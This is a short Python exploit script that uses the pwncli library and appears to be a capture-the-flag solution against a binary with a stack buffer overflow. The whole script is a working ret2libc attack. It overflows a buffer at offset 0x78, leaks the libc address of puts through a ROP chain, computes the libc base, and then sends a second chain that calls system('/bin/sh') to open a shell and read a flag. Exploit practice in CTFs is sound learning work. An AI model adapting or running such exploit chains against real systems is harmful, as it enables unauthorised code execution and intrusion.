#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


p.sendlineafter("Please input your name:\n", "wyBTs")

"""
0x0000000000400983: pop rdi; ret; 
0x0000000000400981: pop rsi; pop r15; ret; 
"""
pop_rdi_ret = 0x0000000000400983
pop_rsi_r15_ret = 0x0000000000400981

payload = flat({
    0x78:[
        pop_rdi_ret,
        elf.got['puts'],
        elf.plt['puts'],
        0x400801
    ]
})

p.sendlineafter("Please input your code to save\n", payload)

m = p.recvline_contains("\x7f")
log_ex(f"get msg: {m}")

libc_base_addr = u64_ex(m) - libc.sym['puts']
libc.address = libc_base_addr
log_libc_base_addr(libc_base_addr)

payload = flat({
    0x78:[
        0x000000000040055e,
        pop_rdi_ret,
        libc.search(b"/bin/sh").__next__(),
        libc.sym['system'],
    ]
})

p.sendlineafter("Please input your code to save\n", payload)

get_flag_when_get_shell(p)

p.interactive()